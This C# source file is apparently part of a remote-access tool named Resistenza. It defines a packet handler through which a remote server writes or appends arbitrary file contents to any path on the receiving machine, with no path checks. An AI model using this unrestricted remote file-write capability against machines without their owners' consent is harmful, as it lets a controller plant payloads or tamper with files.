using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using Resistenza.Common.Tools;

namespace Resistenza.Common.Packets
{
    public class FileUploadRequest : IPacket
    {
        public string Type { get; set; }
        public string FilePath { get; set; }
        public byte[] FileBytes { get; set; }
        public bool IsLastOfRequest { get; set; }
        public bool IsPart {  get; set; }


        public FileUploadRequest()
        {
            Type = this.GetType().ToString() ;
        }

        public async Task HandleAsync(SecureStream ServerStream)
        {
            //Se non esiste la directory, viene creata


            string FileParentDir = Directory.GetParent(FilePath).FullName;

            if (!Directory.Exists(FileParentDir))
            {
              
                Directory.CreateDirectory(FileParentDir);
            }

            var Response = new FileUploadResponse();
            Response.IsLastOfRequest = IsLastOfRequest;

            try
            {
                byte[] Decompressed = FastCompression.Decompress(FileBytes);
                if (IsPart)
                {
                    using (var Stream = new FileStream(FilePath, FileMode.Append))
                    {
                        
                        Stream.Write(Decompressed, 0, Decompressed.Length);
                    }
                }
                else
                {
                    File.WriteAllBytes(FilePath, Decompressed);
                }

                

            }
            catch(Exception e)
            {
                switch (e)
                {
                    case DirectoryNotFoundException:
                        Response.Error= "Unable to upload file. Choosen directory doesn't exist anymore.";
                        break;
                    case IOException:
                        Response.Error= "Unable to upload file. I/O error occurred, report this.";
                        break;
                    case UnauthorizedAccessException:
                        Response.Error = "Unable to upload file. You haven't the permissions to write in that directory.";
                        break;
                    default:
                        Response.Error = "Unable to upload file. Uknown error, report this.";
                        break;

                }
            }

            await ServerStream.SendPacketAsync(Response);
        }
    }
}
